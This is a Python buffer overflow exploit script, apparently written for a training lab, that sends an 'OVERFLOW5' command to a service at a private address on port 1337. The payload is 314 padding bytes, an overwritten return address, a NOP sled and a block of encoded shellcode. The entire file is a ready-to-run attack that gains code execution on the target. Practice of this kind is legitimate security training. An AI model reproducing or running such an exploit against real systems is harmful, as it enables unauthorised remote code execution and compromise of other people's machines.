import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW5 '
buffer += b'A' * 314
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xfc\xbb\x7a\xe6\x7d\x69\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x86\x0e\xff\x69\x76\xcf\x60\xe3"
shellcode += b"\x93\xfe\xa0\x97\xd0\x51\x11\xd3\xb4\x5d\xda"
shellcode += b"\xb1\x2c\xd5\xae\x1d\x43\x5e\x04\x78\x6a\x5f"
shellcode += b"\x35\xb8\xed\xe3\x44\xed\xcd\xda\x86\xe0\x0c"
shellcode += b"\x1a\xfa\x09\x5c\xf3\x70\xbf\x70\x70\xcc\x7c"
shellcode += b"\xfb\xca\xc0\x04\x18\x9a\xe3\x25\x8f\x90\xbd"
shellcode += b"\xe5\x2e\x74\xb6\xaf\x28\x99\xf3\x66\xc3\x69"
shellcode += b"\x8f\x78\x05\xa0\x70\xd6\x68\x0c\x83\x26\xad"
shellcode += b"\xab\x7c\x5d\xc7\xcf\x01\x66\x1c\xad\xdd\xe3"
shellcode += b"\x86\x15\x95\x54\x62\xa7\x7a\x02\xe1\xab\x37"
shellcode += b"\x40\xad\xaf\xc6\x85\xc6\xd4\x43\x28\x08\x5d"
shellcode += b"\x17\x0f\x8c\x05\xc3\x2e\x95\xe3\xa2\x4f\xc5"
shellcode += b"\x4b\x1a\xea\x8e\x66\x4f\x87\xcd\xec\x8e\x15"
shellcode += b"\x68\x42\x90\x25\x72\xf3\xf9\x14\xf9\x9c\x7e"
shellcode += b"\xa9\x28\xd9\x61\x4b\xf8\x14\x0a\xd2\x69\x95"
shellcode += b"\x57\xe5\x44\xda\x61\x66\x6c\xa3\x95\x76\x05"
shellcode += b"\xa6\xd2\x30\xf6\xda\x4b\xd5\xf8\x49\x6b\xfc"
shellcode += b"\x9b\x0c\xff\x9c\x75\xaa\x87\x07\x89\x34\x78"
shellcode += b"\xc8\x89\x34\x78\xc8"






payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
